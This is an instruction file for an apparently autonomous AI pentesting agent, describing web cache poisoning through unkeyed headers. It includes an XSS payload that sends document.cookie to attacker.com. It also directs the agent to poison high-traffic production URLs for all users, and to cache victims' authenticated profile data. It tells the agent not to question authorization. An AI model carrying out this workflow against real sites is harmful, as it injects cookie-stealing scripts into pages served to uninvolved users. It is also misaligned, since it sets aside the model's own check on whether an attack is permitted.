# C17_cache_poisoning

Inject unkeyed HTTP headers into a cached response to poison the cache for other users. Unkeyed-header poisoning means the cache stores a response that was influenced by an attacker-controlled header (e.g. `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) but does not include that header in the cache key — so all subsequent users who request the same URL receive the poisoned response. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface is served through a CDN, reverse proxy, or caching layer (Cloudflare, Fastly, Varnish, Nginx, CloudFront, Squid).
- Recon or response headers show `Age`, `X-Cache`, `CF-Cache-Status`, `X-Varnish`, `Via`, or `Surrogate-Control`.
- Traffic shows the application reflecting headers into the response body or Location headers.
- Bug-class hints include `cache-poisoning`, `unkeyed-header`, `web-cache-deception`, or `host-header`.

---

## Workflow

1. **Load assignment and confirm caching layer.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   Fetch the target's homepage and check for cache indicators:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/", egress_profile })
   ```
   Note `Age`, `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Vary`, `Cache-Control` headers. Determine the cache key components (usually: scheme + host + path + allowed query params).

2. **Cache buster setup.**
   Use a unique cache-buster query parameter to isolate test responses from production cache:
   All test requests append `?cb=mantis-<timestamp>` to the URL. This ensures the attacker's poisoning attempts target a unique cache slot and do not accidentally poison legitimate users' cache entries during discovery.
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/?cb=mantis-001", egress_profile })
   ```

3. **Identify unkeyed header candidates.**
   Test each candidate header by injecting a distinguishable value and checking if it appears in the response body or headers:
   - `X-Forwarded-Host: attacker.example.com`
   - `X-Forwarded-Scheme: http`
   - `X-Original-URL: /admin`
   - `X-Rewrite-URL: /admin`
   - `X-Host: attacker.example.com`
   - `X-Forwarded-For: 127.0.0.1`
   - `X-Custom-IP-Authorization: 127.0.0.1`
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/?cb=mantis-002", headers: { "X-Forwarded-Host": "attacker.example.com" }, egress_profile })
   ```
   Check whether `attacker.example.com` appears in the response body (e.g. in a canonical link, absolute URL, or script src).

4. **Confirm header is unkeyed.**
   Send the same request twice — first with the injected header, then without — and compare responses. If the second response (without the header) contains the injected value and has `X-Cache: HIT`, the header is unkeyed:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/?cb=mantis-003", headers: { "X-Forwarded-Host": "attacker.example.com" }, egress_profile })
   ```
   Then immediately:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/?cb=mantis-003", egress_profile })
   ```
   If response 2 returns `X-Cache: HIT` and contains `attacker.example.com` in the body, the cache is poisoned.

5. **Construct the poisoning payload.**
   With a confirmed unkeyed header and a reflected value, craft a payload that injects malicious content:
   - XSS via reflected host: `X-Forwarded-Host: attacker.com"><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
   - Redirect via reflected scheme: `X-Forwarded-Scheme: http` (forces the application to redirect to HTTP, stripping HTTPS)
   - JS import poisoning: `X-Forwarded-Host: attacker.com` where the app loads `//host/static/app.js`

6. **Poison the target URL without cache buster.**
   Once the payload is constructed, poison a high-traffic URL without the cache buster. Choose a URL that:
   a. Is likely to be cached (long TTL, no authentication required, high-traffic path like `/`, `/login`, `/static/app.js`).
   b. Returns the unkeyed header in its response.
   Send the poisoning request; confirm the cache stores the poisoned version:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/", headers: { "X-Forwarded-Host": "attacker.com" }, egress_profile })
   ```
   Then fetch without the header and confirm `X-Cache: HIT` with attacker value in body.

7. **Web cache deception variant.**
   Test whether the cache can be tricked into storing a sensitive authenticated response by appending a fake static file extension:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/user/profile/style.css", auth_profile: "victim", egress_profile })
   ```
   If the application serves the profile page (ignoring the `.css` extension) and the cache stores it as a cacheable response, an unauthenticated attacker fetching the same URL receives the victim's profile data.

8. **Fat GET — body-in-GET request.**
   Test whether the server reads query parameters from a GET request body (non-standard but supported by some frameworks):
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/?cb=mantis-004", body: { x_forwarded_host: "attacker.com" }, egress_profile })
   ```

9. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/", method: "GET", bug_class: "cache_poisoning_xss", auth_profile: "attacker", status: "promising"|"tested", evidence_summary: "X-Forwarded-Host: attacker.com reflected in response body; X-Cache: HIT on second request without header" }] })
   ```

10. **Record chain attempt.**
    ```
    mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "cache-poison-to-xss", step: "cache_poisoned", evidence: "/ poisoned with X-Forwarded-Host: attacker.com; second fetch without header shows attacker.com in body with X-Cache: HIT", outcome: "finding_recorded" })
    ```

11. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "Web cache poisoning via unkeyed X-Forwarded-Host — persistent XSS for all users", severity: "critical", cwe: "CWE-444", endpoint: "/", description: "...", proof_of_concept: "<poisoning request with header + second request without header + X-Cache: HIT + attacker value in body>", response_evidence: "...", impact: "Any user visiting the homepage receives XSS payload; account takeover at scale", validated: true })
    ```

12. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["Cache poisoning XSS confirmed; feeds C10 for CSRF chain escalation", "Web cache deception on /api/user/profile — partial evidence, needs victim-session test"] })
    ```

13. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "cache_poison_replay", notes: "Poison with fresh payload; wait 30s for cache to serve to a fresh unauthenticated client; confirm attacker value in body" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- The poisoning request (with injected header and value) and the response showing the value reflected.
- The second request (without the header) with `X-Cache: HIT` (or equivalent) and the attacker value persisting in the response body.
- Cache TTL observed (from `Age`, `Cache-Control: max-age`) to confirm persistence.
- For web cache deception: the authenticated response cached under a `.css` URL, and the unauthenticated fetch returning victim data.

---

## Stop conditions

- Cache key includes `Vary: X-Forwarded-Host` or all candidate headers; injected values alter the cache key and never hit a shared slot.
- Application serves only `Cache-Control: private` or `no-store` responses; CDN refuses to cache.
- Reflected values are HTML-encoded; no XSS execution path.
- Cache TTL is zero; poisoned entry expires immediately.
- Two WAF blocks on header-injection attempts — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Cache buster in production poisoning.** Always use a cache-buster during discovery. Only drop the cache buster for the final poisoning confirmation step, and immediately after confirming the finding, avoid further requests to the poisoned URL to limit blast radius.
- **User-specific cache partitioning.** Browsers and some CDNs partition caches per user via cookie or network state. Confirm that the poisoned response is served to a different client (different session, different IP, or unauthenticated) before claiming it affects other users.
- **Server-side header stripping.** Nginx and Apache often strip non-standard headers before passing to the application. Confirm the header reaches the application by checking the reflection before testing cache storage.
- **Age=0 false positive.** A response with `X-Cache: MISS` and `Age: 0` has not been served from cache. Only claim poisoning when `X-Cache: HIT` or `Age > 0` is present on the second fetch.

---

## Next chain

Feeds into **C10_xss_to_csrf** (use cache-poisoned XSS to execute CSRF-bypassed mutations), **C12_account_takeover** (poisoned XSS on login page steals credentials or session tokens), and **C18_subdomain_takeover** (dangling DNS may enable cache poisoning via a subdomain that the CDN considers trusted).
